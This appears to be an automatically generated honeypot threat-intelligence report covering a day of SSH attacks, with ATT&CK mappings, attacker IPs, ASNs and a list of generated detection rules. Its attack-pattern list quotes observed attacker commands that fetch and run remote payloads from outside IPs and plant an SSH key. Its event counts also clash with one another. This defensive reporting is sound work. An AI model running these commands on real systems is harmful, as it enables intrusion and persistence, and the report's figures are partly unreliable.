# Threat Intelligence Report

**Generated**: 2026-04-19 21:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **8 events** from **524 unique source IPs** across **32 countries** and **44 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 8 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 524 |
| Atomic Attack Patterns | 19 |
| MITRE ATT&CK Techniques | 5 |
| Generated Sigma Rules | 3 |
| Generated YARA Rules | 2 |
| Generated Suricata Rules | 1 |
| Blocked IPs (Firewall) | 360 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 6 |
| T1105 (Ingress Tool Transfer) | | 4 |
| T1059.004 (Unix Shell) | | 2 |
| T1552.004 (Private Keys) | | 1 |
| T1005 (Data from Local System) | | 1 |

### Tactics Distribution

- **discovery**: 6 events ███
- **command_and_control**: 4 events ██
- **execution**: 2 events █
- **credential_access**: 1 events 
- **collection**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 9,216 |
| France | 4,773 |
| Mexico | 2,743 |
| Germany | 772 |
| Netherlands | 424 |
| Bulgaria | 357 |
| United Kingdom | 237 |
| Pakistan | 183 |
| Singapore | 150 |
| Hong Kong | 125 |
| China | 82 |
| Israel | 51 |
| Japan | 45 |
| Ukraine | 24 |
| South Korea | 23 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 7,676 |
| Modat B.V. | 3,339 |
| Sierra Madre Internet SA de CV | 2,652 |
| OVH SAS | 1,405 |
| Google LLC | 501 |
| Tube-Hosting | 486 |
| Amazon.com, Inc. | 338 |
| ColocaTel Inc. | 327 |
| Alibaba US Technology Co., Ltd. | 279 |
| Censys, Inc. | 243 |
| Hydra Communications Ltd | 232 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 210 |
| NewVM B.V. | 192 |
| Vpsvault.host Ltd | 166 |
| Microsoft Corporation | 128 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `177.125.137.18` | 2,652 | Attacker |
| `104.243.43.7` | 2,124 | Attacker |
| `104.243.35.92` | 1,856 | Attacker |
| `104.243.35.94` | 1,807 | Attacker |
| `51.68.207.118` | 1,402 | Attacker |
| `104.243.32.126` | 928 | Attacker |
| `206.221.176.60` | 901 | Attacker |
| `85.217.140.16` | 683 | Attacker |
| `185.91.127.85` | 486 | Attacker |
| `85.11.167.11` | 320 | Attacker |
| `85.217.140.37` | 273 | Attacker |
| `85.217.140.41` | 258 | Attacker |
| `85.217.140.33` | 255 | Attacker |
| `85.217.140.6` | 201 | Attacker |
| `85.217.140.53` | 194 | Attacker |
| `85.217.140.40` | 176 | Attacker |
| `85.217.140.8` | 164 | Attacker |
| `85.217.140.25` | 163 | Attacker |
| `85.217.140.19` | 153 | Attacker |
| `31.14.32.8` | 133 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 524 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 0 |

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [6x] `uname -a`
- [1x] `cd /usr`
- [1x] `curl -O 61.184.10.103/gg`
- [1x] `chmod 0755 gg`
- [1x] `rm -rf gg`
- [1x] `curl -O 61.184.10.103/syss`
- [1x] `chmod 0755 syss`
- [1x] `./syss`
- [1x] `echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAmFBsJB43Hg7IM/dnZVUYAOI68/xIJvO2sebbI2hQq9jcbloVpF3rY6oqny`
- [1x] `netstat -tulpn`
- [1x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [1x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [1x] `curl -sk https://46.151.182.82/sh`
- [1x] `sh -s ssh`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 3 | `sigma/*.yml` |
| YARA (Payload) | 2 | `yara/*.yar` |
| Suricata (IDS/IPS) | 1 | `suricata/honeypot.rules` |
| Firewall (iptables) | 360 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*